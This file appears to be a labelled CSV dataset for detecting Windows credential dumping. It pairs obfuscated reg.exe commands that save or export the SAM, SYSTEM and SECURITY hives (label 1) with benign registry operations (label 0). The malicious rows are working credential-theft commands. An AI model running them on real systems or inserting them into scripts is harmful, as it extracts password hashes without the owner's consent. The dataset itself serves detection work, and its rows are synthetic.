text,label
pOWeRsHELl -exEC Bypass -W hIDDen -C ReG.eXe  EXpoRt hkLM\System  \\LOCAlHOSt\c$\__DUMP\SAm.BaK  /y,1
CMD.ExE /C STARt /b rEg   ExpOrt   hklM\seCUrItY  \.\c$acKuP.rEG /y,1
poweRSHElL -COMMAnd reG  export  HKLM\sam c:\usERS\publIc\REgIsTry_EXporT.REG  /y,1
"rEG  SAVe  ""hKey_USerS\SOFTWaRe\pOliCIes\mycorp""  ""C:\TemP\UsEr_SettINGS.Reg""",0
"reg query ""hku\hkey_local_machine\system\currentcontrolset\control\subkey29"" /v path",0
"Reg.eXE qUeRY ""HKCu\HKey_LocAL_maCHinE\sYSTem\CURREntCONtrOLSeT\cONtroL"" /f",0
"reg.exe   copy   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey76""   ""hkcu\system\currentcontrolset\services_177""",0
"Reg   aDd   ""HKcu\softwAre\POLicies\myCoRp""   /V vErSiOn   /T Reg_sZ   /D ""C:\pRoGRAM fILeS\apP""",0
powershell -command reg export  hkey_local_machine\security   %temp%\sec_backup.dat  /y,1
powershell -exec bypass -w hidden -c reg   save  hkey_local_machine\system   c:\windows\temp\sam.save,1
"Reg.exe QUERy ""Hku\SOFtWARE\ClassES"" /v LasTupDaTe",0
"REG.eXE querY ""hkU\SOFtWaRE\MYAPP\settInGS"" /F",0
c:\WindoWs\sYStem32\cmd.EXE /k ReG SavE HKey_loCAl_mAChINe\SYsTEM   C:\tEmp\SYsTeM.HiVe  /y,1
powershell -exec bypass -w hidden -c reg   save hklm\sam \\localhost\c$\__dump\sam.bak   /y,1
"reg   add   ""hkcu\hkey_local_machine\software\policies\microsoft\subkey83""   /v lastupdate",0
"CmD /C rEG   adD   ""hKeY_usERs\HkEY_LocAL_MAcHiNe\SyStem\CURREntCOntrolsET\COntROl""   /v lAstupDAte      /d 1",0
powershell -command reg.exe  export  hkey_local_machine\system   \.\c$ackup.reg,1
"cMD /C REg.EXE  coMpare  ""HkEY_loCaL_MachiNE\hkey_LocaL_MaChIne\sySTeM\cUrrentConTROLset\COnTrol""  ""HKEY_LocAl_MACHINe\sofTware\miCROSOfT\WINDOwS\CurreNTVeRsION_805""",0
cmd.eXE /C REG.EXe   eXPorT   hKEy_LOcAl_MAchinE\SECUriTy c:\wIndOWS\tEMp\Sam.SavE,1
poWErshELl -cOMMAND REG  eXPOrT hKlm\SECuRity c:\tEMP\sYstEM.HiVe  /Y,1
"reg.exe   add   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey37""      /t reg_dword   /d ""1.0.0""",0
"reg  unload  ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey42""",0
poweRSHeLl -CoMMAnD REg  SAvE  Hklm\seCURitY \\LOCaLHoSt\C$\__dUMp\sAm.BAk  /y,1
"cmd /c powershell -c ""reg.exe   export   hklm\sam   %temp%\sec_backup.dat /y""",1
"reg  add  ""HKey_locaL_machine\sOFtWARe\pOliciES\MyCOrp""  /f",0
"staRt /B rEg   REStoRe   ""HKEY_CurReNT_usER\sysTEM\CUrrenTControlseT\SeRvICeS""   ""HKEY_cuRrEnt_USER\envIronmeNt_555""",0
"cmd /c reg   delete   ""hkcu\software\policies\mycorp""",0
cMD.exE /C ReG  EXPOrT   HkLM\saM   \.\C$ACKuP.ReG,1
"REG   UNLOad   ""HkeY_uSeRs\SYstEm\cURREnTcoNtRoLSeT\SerVIcES""   /V vErsiOn",0
powershell -command reg   export  hklm\sam c:\temp\system.hive  /y,1
c:\wiNDowS\SysTEm32\CmD.Exe /k reg.EXE   EXpoRT Hkey_lOcAL_MaChiNe\SYSTEM   C:\wIndOWS\TemP\sAM.SaVe  /Y,1
pOwErshElL -COMMAnd rEG.Exe  exPOrT   hKEY_lOcAL_MAChINe\Sam C:\wiNdOws\tEmp\sAm.sAVe,1
"CMD /C reg deleTe ""hKcU\conTroL paneL\DESktOp"" /f",0
PoWeRshEll -coMmaNd Reg.ExE SaVe hkLM\Sam C:\uSerS\PublIC\registrY_EXPORt.REg,1
REg  eXPort  hkeY_lOcAl_machInE\SAM  \\LOcalHost\c$\__dUMP\sAM.baK,1
"Reg.eXE  uNloAd  ""Hku\CONTrOL paNel\dESktop""",0
"cmd /c powershell -c ""reg.exe save  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak   /y""",1
pOweRsHelL -COmmAND rEg.EXe  SAVE hKLM\SaM \\LOcALHost\c$\__DUMp\saM.bak,1
cmd.exE /c REG.eXe  Save  HKLM\sam  %teMp%\SeC_BacKUP.daT,1
cmd.Exe /c STArT /B rEG.ExE  exPoRt HKLm\SecuRity c:\TEmP\systEM.HiVE,1
"cmd /c reg  add  ""hkey_local_machine\control panel\desktop\subkey31""  /v path  /t reg_dword  /d 1",0
"powersHell -C rEG   dEletE   ""HkEy_LOCal_maChIne\SofTwaRE\MYApP\SettiNGs""   /v vERSiON",0
Pwsh -noprOfILE -c rEg   saVe hKEY_lOCAL_MAcHInE\SeCURiTY \\lOCaLHOst\C$\__Dump\SAm.bak /Y,1
"cmD /C pOwERSHEll -c ""Reg.ExE EXpoRT  HKeY_locAl_MaCHInE\sAm  \\LOCAlHosT\c$\__DUMP\sAm.bAk""",1
C:\WinDoWs\SyStEm32\cmd.eXe /k rEG.ExE eXPORT  hKeY_LocaL_mAChINE\SEcurITY   %Temp%\sEc_BacKUp.DAt,1
"start /b reg.exe   query   ""hku\software\classes""   /v path",0
"STArT /b REG  QUerY  ""HkeY_usERS\SofTWare\MyApp\SettINGs""  /v lAsTUPDATE",0
"sTARt /B ReG  COpY  ""hKCu\hKey_LOCAL_MaCHinE\soFtwAre\pOlICIes\miCrOsoFt""  ""HkCu\HKEY_LoCAl_mAChINe\SysTem\cUrrEntcoNTrOlseT\ConTrol_418""",0
powershell -command reg.exe  save   hklm\sam   \.\c$ackup.reg   /y,1
"reg.exe   compare   ""hkey_local_machine\software\microsoft\windows\currentversion\subkey88""   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control_651""",0
"CmD /C powersHelL -c ""REg  saVE hkeY_LOCal_mAChInE\SAM   C:\windOWS\tEmp\saM.sAVE  /Y""",1
pOWErsheLl -comMANd REG eXPort   hKEY_LOCaL_MaCHine\SEcURITy  \\loCAlHoSt\C$\__DuMP\SaM.BAK,1
cMD.exe /c REg  SavE  hkEY_LoCAL_MaCHiNE\SYstem  \\localHost\c$\__duMp\SAm.Bak   /Y,1
pWSh -nOproFILE -C rEg.exe savE   hkeY_local_machINe\SaM   %teMp%\sEC_BaCkuP.DAT /Y,1
POweRshELl -cOmMaND rEg.eXE  EXPoRT   hkeY_lOCAl_MacHiNe\sYstEm   C:\WInDoWS\TEMP\SAm.sAvE,1
pwsh -noprofile -c reg.exe  save hkey_local_machine\system  %temp%\sec_backup.dat,1
C:\WiNDoWS\sYsTEm32\cmD.EXE /K ReG SaVe   HKlm\sAm c:\uSERs\pUbliC\RegiStrY_EXpOrt.reg,1
"powershell -c reg.exe  unload  ""hkey_current_user\hkey_local_machine\software\policies\microsoft""  /v lastupdate",0
"sTArt /b REg  sAVE  ""hKEY_Local_mACHiNE\hKEY_LOCal_MaCHinE\SOfTwARe\PoLIcIeS\MICrosoft""  ""D:\BAckup\rEgiStRY_hIve.DAT""  /y",0
powershell -command reg  export hkey_local_machine\system   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe export hkey_local_machine\security  \.\c$ackup.reg,1
cmd.exe /c reg.exe  save  hkey_local_machine\security \.\c$ackup.reg  /y,1
poWERShelL -EXeC Bypass -W hIdDEn -C reG   sAvE  HKEy_LOcaL_macHIne\sYSTEm   C:\wiNdOws\TemP\SAM.sAvE  /y,1
"REG  cOMPArE  ""hKEY_CuRrENT_USer\SySteM\curRENtcoNtrolseT\sERVIcES\SuBkeY86""  ""hKey_CUrRENT_user\sySTeM\cuRReNTControlseT\sERVIces_369""",0
"REG   copY   ""HkU\sOFTWarE\claSSeS\SUbkEy15""   ""HKU\systeM\cuRreNtcONtroLseT\sErVICEs_306""",0
"reg.exe   save   ""hkey_users\environment""   ""c:\windows\temp\software_dump.dat""   /y",0
"PoweRsHEll -c REG  QUery  ""hKu\Hkey_LoCAL_mAChIne\soFTwarE\Wow6432nODe\SuBkEy29""  /v PatH",0
"CmD /C pOwERsHell -C ""REg.exe  ExpOrT  HKEy_locAl_MAChinE\SeCurITY   C:\windOwS\TEmp\SaM.Save""",1
powershell -command reg.exe   save hkey_local_machine\sam  c:\users\public\registry_export.reg   /y,1
"reg   restore   ""hku\software\myapp\settings\subkey89""   ""hku\hkey_local_machine\system\currentcontrolset\control_501""",0
C:\wIndowS\System32\CmD.ExE /K reg   EXPOrt  HkLM\seCURity C:\wINdOWS\teMP\sAM.SAve  /y,1
reG  sAve  hklm\sEcuRIty  \\lOCaLhOst\c$\__DUmP\Sam.BAk,1
cMd.eXE /c ReG.Exe   eXpoRT hKEy_local_maCHINe\SYsTEM   \\lOcAlhoST\c$\__dump\saM.baK,1
POwERSHelL -COMmAND rEG  ExPORt   HKLm\sYsteM   \\locALhOsT\C$\__dumP\SAM.baK /y,1
"reg.Exe   CopY   ""hkEY_uSers\EnvIRonMEnt\SuBkey74""   ""HkeY_UsErs\SofTwaRe\pOLIcIeS\mYCoRp_171""",0
pwsh -NOProFILe -C rEg.eXe  ExPOrT  HKeY_LOCal_MACHInE\sAm  c:\WindOWS\temp\SaM.saVE  /y,1
"cmD /c POWERShElL -C ""rEg ExpORT HKeY_LOCaL_maCHINE\sAM C:\uSErs\puBlic\reGiSTrY_ExpOrT.reG""",1
C:\WinDowS\syStEM32\CMD.EXE /K reG.EXE   sAvE   hKEy_LOcaL_mAcHIne\sYstEM   %TeMp%\SeC_bAcKUp.dAt,1
Cmd.eXE /c rEg.ExE ExPort  hKLm\SYSTeM   C:\teMp\SYStem.hiVE,1
C:\winDOWs\SyStem32\cMD.eXe /k rEg  SaVE HKlM\sYsteM  C:\WiNdows\tEmp\saM.SavE   /Y,1
"reg   query   ""hkey_current_user\software\policies\mycorp""   /v version",0
cmd.exe /c reg export  hklm\system   c:\users\public\registry_export.reg,1
"reg.exE CopY ""HKey_uSeRS\soFtWARe\mYApp\sEtTiNGS\sUbkEy92"" ""HKeY_usErS\sOFTwaRE\poLICies\myCORP_265""",0
cmd.exe /c reg.exe   save hklm\sam  c:\temp\system.hive /y,1
"reg.exe  compare  ""hkey_local_machine\software\classes""  ""hkey_local_machine\software\policies\mycorp_366""",0
"reG querY ""HKeY_locAL_maChINe\hkey_LOCal_MAChINe\SOFTWaRe\pOLiciES\miCrOSOfT"" /f",0
c:\windows\system32\cmd.exe /k reg save   hkey_local_machine\sam   \.\c$ackup.reg,1
"REg adD ""hKEy_cURREnT_UseR\SOFtWArE\pOlICIes\mycOrP\sUbKeY23"" /V path /T Reg_sZ /d ""C:\PRogRAM fILes\App""",0
"reg  query  ""hkey_local_machine\software\microsoft\windows\currentversion""",0
powershell -exec bypass -w hidden -c reg.exe  export   hkey_local_machine\system   c:\users\public\registry_export.reg   /y,1
"CmD /c POWErSHEll -C ""reg.Exe  ExPORT  hkEY_loCAl_mAchInE\sYstEm   c:\userS\pubLiC\REgIsTRY_eXport.REg  /Y""",1
"reg.Exe   cOpy   ""hKEY_useRS\sOFTwARe\MicrOSofT\WiNdowS\curRENTveRsION""   ""HKEy_UserS\hKey_LoCal_mAChine\SyStem\CURRenTCoNTrOlSET\coNtROL_635""",0
cMD.exe /C reg save hkEy_LOcAL_MACHInE\sySTeM  c:\wINdows\teMp\SAm.save,1
"cmd /c reg.exe  unload  ""hkey_users\control panel\desktop""  /v version",0
cMd.EXE /c sTARt /B ReG.Exe  ExPOrT hKLm\sYStEm   %TEmP%\Sec_BaCKUP.daT /Y,1
"rEg.EXE  delEte  ""hKey_useRs\ENvIronment""  /v veRSIOn",0
"Reg  AdD  ""hKu\hkEy_LOCal_MachINE\sYSTEm\CurreNTCONTrOlsET\ContRoL\subkEy6""      /D 1",0
"Reg.EXe  unloAd  ""Hkey_loCAL_maChInE\HkEY_lOCAl_machINe\SOFTWArE\woW6432Node\SUbkeY7""  /V PATh",0
pOwerShEll -COMmAnD reg   ExPORT   HKey_loCAL_MachINE\SeCUrITy  c:\userS\PubLiC\regIstrY_EXpORt.rEG,1
CMD.exe /c reG ExpOrT  HKey_LocaL_maCHinE\seCurItY   \\locAlhOsT\C$\__dUmP\saM.BAK,1
powershell -exec bypass -w hidden -c reg save   hklm\sam   c:\windows\temp\sam.save,1
"rEg.Exe savE ""hKEY_loCal_mAchINE\HKEy_LOCal_macHine\SYstem\cuRREntCoNTrOLset\COntrol\subkey30"" ""d:\BAckuP\REgIStrY_HIve.DAT"" /Y",0
"rEg.Exe   UnloaD   ""hkU\SYsTEM\CURRentcONtRolseT\SErViCES\sUBKEy35""   /v lastUpDate",0
powErsHEll -commANd reg savE   HKlM\sAm \\lOCalHoSt\c$\__duMp\sAm.bAk /Y,1
"reg.eXE  DelETe  ""HKey_locAl_mAcHiNE\soFtWare\poLicIES\MyCorP\sUBKEY9""  /v laStUPdaTe",0
"reG.EXE   qUeRY   ""HKCu\SoftWARe\mIcROSoFT\wINdows\cUrReNTVersIOn""   /V vERsion",0
"REg  Add  ""Hkey_CUrrENt_user\syStEM\CUrReNTCONTrolSET\SERvICEs""  /v VERSioN  /t REg_Sz  /d ""1.0.0""",0
"reg.exe  restore  ""hkey_users\hkey_local_machine\system\currentcontrolset\control""  ""hkey_users\hkey_local_machine\system\currentcontrolset\control_423""",0
c:\WiNDowS\SYsTem32\CmD.exE /K rEg   SAve   hkEY_lOcAL_MaCHiNe\sysTem C:\wINdows\temp\SaM.SAvE /Y,1
cmd.exe /c start /b reg.exe   export  hkey_local_machine\system   c:\temp\system.hive,1
pwsh -NOprofilE -C reg  expORt   HKEy_lOcAL_maChiNE\SeCURITY \\loCaLHoSt\C$\__DUMp\saM.bAk /Y,1
"reg   compare   ""hku\software\myapp\settings\subkey32""   ""hku\software\policies\mycorp_519""",0
"CMd /c PowErsheLl -C ""reg  SAve   hklm\systEm   C:\uSeRS\pUblic\REgisTRY_EXpOrT.ReG""",1
PoWERShEll -EXEc BYPass -W hIdden -c ReG.ExE  ExPort hKlM\SAm  \.\c$ACkuP.REg   /y,1
powershell -command reg.exe export   hkey_local_machine\sam \.\c$ackup.reg,1
"cmD /C pOWeRSHEll -C ""rEg.EXe   save   Hkey_lOcAL_machINE\sYSteM \\lOCalhosT\c$\__DUmp\sam.BAk /y""",1
CmD.ExE /C Reg.EXe  EXPorT   hKEY_LoCaL_MachINe\syStEM   %Temp%\SeC_Backup.daT   /y,1
"rEG COPY ""hKEY_useRs\hKey_loCAL_macHine\SyStEm\currenTcONtrOlSeT\COnTRol"" ""HkeY_UsERs\HkEY_LOcAL_MachinE\SYSteM\CURRENtConTroLSet\COnTROL_437""",0
powershell -exec bypass -w hidden -c reg export   hklm\sam  c:\windows\temp\sam.save,1
"CMd /C rEG.EXE   Add   ""HkEy_cuRRENt_USEr\sOFTWaRE\ClasSes\sUBkeY80""   /F   /t REg_Sz",0
cmd.exe /c start /b reg.exe   export   hkey_local_machine\security c:\temp\system.hive  /y,1
"REg   DEletE   ""hKeY_Users\hKey_lOCal_MAcHINe\softWaRE\WoW6432nODE\SubKey88""   /V LaStuPDaTE",0
"cmd /c pOwErsHeLL -C ""REg.EXe saVE hklm\saM   \\LOCALhost\c$\__duMp\saM.Bak /Y""",1
Cmd.exE /c sTARt /B Reg   SAve  HkEy_LoCal_MAchINe\sysTeM  C:\TeMP\sySTem.HIVe  /Y,1
pwsh -noprofile -c reg   save hklm\sam   c:\temp\system.hive  /y,1
pWsh -nOPrOFILE -C reG ExpoRT  HKEY_loCal_MaChInE\sAm  \.\C$ACKUP.REg,1
"powERShElL -C rEG.EXE   queRy   ""HkCU\SoftWaRe\poLicieS\mYCOrp""",0
"Reg   unlOAD   ""hKU\SOFtwARE\microSOft\WInDows\CUrReNtveRSIoN""   /v VERSIon",0
"cmd /C reg CoPy ""hKCU\HKEY_lOCal_mAChiNe\sOfTwaRE\pOliCiES\mIcrOSoft"" ""HKCU\hKEY_LOcaL_macHInE\sOFTware\wOW6432nOdE_826""",0
"rEg  aDD  ""HKEy_UseRs\SofTWarE\CLAsSEs""  /v VersION    /D ""1.0.0""",0
"start /b reg.exe  delete  ""hkey_current_user\software\google\chrome\subkey24""  /v version",0
"PoweRSHElL -C REG  unLoAd  ""hkey_currENt_usER\sOfTWAre\mIcrOsOFT\wINdoWs\cuRREnTVErsion\subKey34""  /v veRsioN",0
c:\windows\system32\cmd.exe /k reg.exe save  hklm\security c:\temp\system.hive   /y,1
CmD.ExE /C stArt /B rEg.Exe  SaVE  hkeY_lOCAL_MachINe\sEcURITY   \.\C$aCkuP.rEG,1
"Cmd /C poWERsHeLL -c ""reg   SavE hKEY_lOCAl_mAChIne\saM   \.\c$Ackup.ReG  /y""",1
powershell -exec bypass -w hidden -c reg  export   hkey_local_machine\security c:\users\public\registry_export.reg,1
C:\WiNdoWS\system32\cMd.EXE /k reG.Exe  saVE HKeY_lOCAl_machiNE\SAm C:\temp\sYsTem.HivE,1
"start /b reg.exe delete ""hkey_users\software\microsoft\windows\currentversion\subkey77"" /v lastupdate",0
"CmD /C pOWerSHeLl -c ""reG.Exe   SaVe  hkEy_loCaL_mAcHiNe\sYSteM   c:\uSErs\PUbLiC\RegiSTry_ExPoRt.reG""",1
"pOwerSHELL -c REG aDd ""hKEY_loCal_mAchINe\sOfTWARE\MYapp\SETtINGS"" /V VerSIoN /t Reg_SZ /D ""C:\PrOgRAm fiLEs\App""",0
PWSh -NOprOfIle -C Reg.exE  saVE hkeY_lOCaL_machINE\sySTEm %TeMP%\seC_bACKUp.DAt   /y,1
cmd.eXe /c sTaRt /b reg.eXE   sAVE  HKlM\SaM  \.\C$ACKUP.reg,1
"CMd /c POWersHElL -C ""rEg  sAvE  HkLm\sAm   C:\tEMP\SysTem.hiVE   /y""",1
CmD.exe /C reg.EXe sAVe HKlm\sam c:\uSeRs\pUBlIc\REGISTrY_ExPoRT.rEg,1
poWERShEll -ExEC BYPASS -W HidDeN -c REG  savE  HkEY_LocAL_mAcHine\sAm  \\loCalHoSt\c$\__dUmp\sAm.BAk  /Y,1
"powershell -c reg.exe   unload   ""hkcu\system\currentcontrolset\services\subkey21""",0
rEg  sAve HKEY_LOcal_macHiNE\SYsTEM   C:\temP\SYStEM.hivE,1
"reg.exe  copy  ""hku\software\google\chrome""  ""hku\control panel\desktop_346""",0
"rEG  cOMpARe  ""hKu\EnVirOnMeNt""  ""hKU\HKEy_LOcaL_mAcHINe\sOfTwaRE\poLICIeS\mICrosoFt_170""",0
PWSH -NOpRoFIlE -C rEg   SAve HkeY_LocAL_macHIne\sAm  C:\tEmP\SysTEm.HiVE,1
"reG.EXE   cOMPArE   ""hkEY_USErs\EnvIrONMent""   ""Hkey_useRs\SoftWaRE\cLASsES_772""",0
"Reg AdD ""hkey_USeRS\SOFtwARE\mICroSOfT\wiNDoWs\curREnTvErSiOn"" /v LAStUpDaTE /T REG_Sz /D ""c:\PROgRAM FILEs\aPP""",0
"PowERsheLL -C rEg   SAvE   ""HKEy_local_mAChInE\HkeY_lOCAL_MAchIne\SOftWARe\POLICies\MiCROSofT\suBkEY95""   ""c:\teMP\UsER_seTtINgS.ReG""   /y",0
POWersheLl -COmMand rEG.eXe   SaVe   hkEy_local_MachiNE\sAM  \.\c$ACkUP.rEg,1
CmD.EXE /c STARt /b REG.eXE   expoRt   HkLm\SySTem  c:\TEMP\sYsTem.hIVE   /y,1
cmd.ExE /c sTART /b REG.EXe  EXpOrT  HkEy_LoCAl_maChINe\sYSTeM  C:\uSeRs\pUBLIC\ReGistry_exPORT.rEg,1
CmD.eXE /c sTaRt /B reG  exPort   hKEy_locAl_maCHiNE\sECuRitY  c:\TeMp\sySteM.hIVE,1
"reG delETe ""hKEy_curReNT_usER\HKeY_LOcAl_maCHiNe\SYsTem\CURReNtCoNtRoLseT\cOntRol\SUbkey20"" /v PaTh",0
Pwsh -NOpROfilE -C reg  SAve hkEY_LOCAl_maChiNe\SAm   c:\uSeRS\pUBliC\rEgIsTry_EXpOrT.REG,1
reG.exE   exPoRT  hkLM\sAm C:\uSERS\PuBLIc\rEGIStry_EXPORt.rEg,1
PWSh -nopRofILE -C reG SAvE HkLM\SYsTEm %tEMP%\sEC_BAckUp.DAT  /Y,1
C:\WINDowS\SyStEM32\CmD.Exe /K rEG.EXE   expOrT HKey_loCAL_mACHine\SECURITy  \.\C$ACKuP.ReG   /y,1
"reg.exe compare ""hkcu\software\myapp\settings"" ""hkcu\software\google\chrome_349""",0
REg.eXE  EXPorT HkeY_local_mAcHInE\sEcuRItY  c:\userS\PUBlIc\ReGisTRY_EXpORt.reg  /y,1
"cmd /c reg.exe  query  ""hkey_current_user\software\myapp\settings\subkey96""  /f",0
cmD.EXE /c rEG.exe  eXport hKLm\sam  %TemP%\seC_bacKuP.Dat,1
"reg   query   ""hku\hkey_local_machine\software\wow6432node\subkey96""   /v lastupdate",0
"cmd /C POweRShElL -c ""rEg savE hKey_LOcal_mAChiNe\sEcuRITy  \\localhOst\c$\__DumP\sAM.bak""",1
"ReG.ExE   restORE   ""hKEy_CURRENt_USER\hkEY_LoCAl_macHInE\sofTwARE\wOW6432noDe\subKeY54""   ""hKeY_CUrRENT_useR\sOfTware\gOoGle\ChrOmE_291""",0
"powershell -c reg   save   ""hkey_current_user\hkey_local_machine\software\wow6432node""   ""c:\temp\user_settings.reg""",0
c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security  %temp%\sec_backup.dat  /y,1
"reg  unload  ""hku\software\google\chrome\subkey39""  /v version",0
C:\wINdOWs\sYStem32\cMD.exe /k rEg ExpoRT   HKeY_LocAl_mAChiNe\sAm C:\WinDOwS\tEMP\saM.sAVE,1
powershell -exec bypass -w hidden -c reg.exe  export   hklm\security  \\localhost\c$\__dump\sam.bak   /y,1
"rEg.Exe ResTOrE ""hkEy_usErS\sOFTWARe\mICroSOFt\WinDOws\cURREntversIoN\subkEY54"" ""hkEy_uSErS\HKEy_loCal_MACHiNe\SoFtWare\PolicIEs\mIcRoSOft_555""",0
"reG  ADd  ""hKey_LOcaL_MaChIne\soFTwARE\cLAsseS""  /f    /D ""c:\pRoGrAM FIlEs\APp""",0
"rEG ReSTORE ""HkU\Hkey_loCAl_maCHIne\soFTwaRe\PoLICIeS\MIcrOSofT\SUbKeY99"" ""hkU\SOftwARE\MyaPP\setTINGs_686""",0
c:\WinDoWS\sysTEm32\Cmd.Exe /k reG.eXE eXPOrt  HkLM\sAm   \\loCaLhOst\C$\__DuMp\SAM.BaK,1
"Cmd /C rEg.eXE   Copy   ""Hkey_cURRenT_USER\hkey_locaL_maCHiNE\SyStEM\cURrENTcOnTrOlset\contrOL""   ""Hkey_CUrreNt_USER\HkEy_loCAL_MAcHIne\SyStEm\cURrEntCoNTRoLsET\controL_889""",0
"Cmd /C ReG.eXE   DElete   ""hku\sOFTwaRe\micROSoFT\WINDowS\cURrENTVeRsIon\SuBKEY69""",0
"poWErShelL -C Reg.EXE  DELeTE  ""hkcu\Hkey_lOcAl_MAChiNE\sYstEM\CurREntCoNTRoLSET\CoNtroL\sUBkey26""",0
"cMd /c ReG SavE ""Hkcu\hkEy_lOcAl_MACHinE\SOftWArE\PoLicIes\MicroSoFt\subkEy34"" ""C:\uSers\PUBLic\cHrome_DatA.BAk""",0
"STaRT /b REG.eXE  CoMPaRe  ""HKeY_UsErS\HkeY_LOcAL_mAcHiNe\SOftwARE\WoW6432Node\sUBkEY94""  ""hKeY_USERs\sySteM\CuRRenTCONTRolSET\serVICes_445""",0
"staRT /B REG.EXe  uNloAd  ""hkcU\SoftWarE\mYapP\SEtTiNgS\SUBKEy11""  /v LastUpdatE",0
"reg.exe  unload  ""hku\software\policies\mycorp""  /v version",0
CmD.EXE /c reg.EXE  SaVE  hKlm\sEcuRITy  C:\WinDowS\temp\SaM.SavE   /Y,1
reg.exe  export hkey_local_machine\sam  c:\temp\system.hive  /y,1
"REg uNLOAD ""HKCU\EnviroNMEnT\SuBkeY62"" /f",0
"cMD /C PowERSHEll -C ""REg   EXpoRT   HKEY_locaL_maChine\SaM   \.\c$ACkuP.reg /y""",1
"REG.eXe SAve ""HKEY_lOCAl_machinE\hKeY_LocAl_MacHINE\soFtwArE\WOW6432NOde\sUBKEy61"" ""C:\useRs\PUBLic\cHrome_DaTa.bAK"" /Y",0
"Reg.ExE  SAve  ""HkU\HkeY_lOCaL_MAchINE\sYSTEm\curReNTcoNTRoLSET\COntRoL\sUbkey64""  ""C:\Temp\USeR_sEttInGS.ReG""",0
PWsH -noprOFiLE -C reg eXpoRT   hkEy_lOCAl_MaCHINE\sAM  c:\WInDows\TEMp\sAM.SAVe   /Y,1
REg   sAve  hKlM\SYSTem c:\windowS\tEMp\SAm.saVE /y,1
powersHELl -eXeC bYPASS -w HiddEN -c REG.ExE sAVE HkeY_LOcAL_mACHinE\SeCuRIty \\LOcalHosT\C$\__dumP\saM.Bak  /y,1
"reg   query   ""hkcu\software\classes""",0
"reG ADd ""HkU\hKey_lOCaL_MachIne\SySTeM\cuRREnTconTRoLSEt\cONtROl\suBKEy90"" /f /T REg_dwoRD /d 1",0
"rEG.EXE   dELeTe   ""hkEy_UsERS\sOFtWARe\mIcrOSoFt\wiNDowS\cUrREnTVersIon""",0
REg.EXE   SAVE   HKlm\sySTem  \\LOcalHOsT\C$\__duMP\sAm.bak,1
PoWeRSHEll -EXec bYPaSS -W hIDdEN -C ReG ExpOrT  HKLm\secuRITY %TEmP%\sec_BackUp.Dat,1
cmd.exe /c start /b reg.exe export  hkey_local_machine\sam  c:\temp\system.hive /y,1
"Reg COPy ""HKEy_uSErS\SOfTwarE\poLICiES\MycOrP\sUBkeY1"" ""hkey_usERs\SOFTwARe\polICiES\MYCorp_458""",0
"reg  REstorE  ""hKu\sOfTwARE\ClAsSES""  ""HKu\hkEy_lOCaL_MaCHiNE\SoFTWArE\Wow6432Node_448""",0
"rEG REStORe ""HKEy_CUrrent_UseR\HKey_loCal_macHINE\SoFTWaRe\PoLiciES\MIcrOSoft\SuBKEy57"" ""HKEY_CuRREnT_USEr\system\cuRRENtcontRoLSeT\ServiCeS_183""",0
CMD.exE /c stArt /B reG.EXe eXpORT   hklm\sYsTem \\lOCAlhOst\C$\__DUMP\SAM.Bak   /Y,1
"sTart /B ReG dELete ""hKeY_uSErs\SoftWARe\PoliCIEs\MYCorp\SUbKEy48"" /V veRSioN",0
"POWerSHelL -c REg  DeLETE  ""hkU\hkeY_LOCAl_MAChiNE\SOFTwARE\policIEs\MICRoSOfT\SubKeY16""  /V lastUPdatE",0
Cmd.Exe /C StART /B Reg.Exe   saVe   hKEY_loCAL_MAChIne\sYSTEM  %TeMP%\sEC_BaCkup.daT   /y,1
pwSH -NoProFIle -C reg  sAVE   hkEy_LOcAL_MAchINE\sECUrity   C:\USeRs\PUbliC\Registry_eXpoRt.rEg,1
"REg cOpy ""hKCU\hkEY_LoCAL_MaChine\SOftware\PoLIcIes\MicROSOFT"" ""HKCu\softwARE\googLE\CHrome_986""",0
"REG.eXE  qUeRY  ""HkCu\hKey_locaL_MaCHiNE\soFtware\pOlICies\MicRosOft""  /F",0
pwsH -nOPrOfIle -c reG.exe SAVE hKLM\SECuRItY   %teMP%\sEC_BACkUP.Dat,1
powershell -command reg.exe save   hkey_local_machine\sam  \.\c$ackup.reg,1
ReG.EXE eXPORt hKlM\SYSTem  c:\tEmP\SYsteM.HIVe,1
CMD.eXE /C reG.eXe   expORT hKlM\sECUrity \\LoCaLHost\c$\__DUMP\SAM.Bak,1
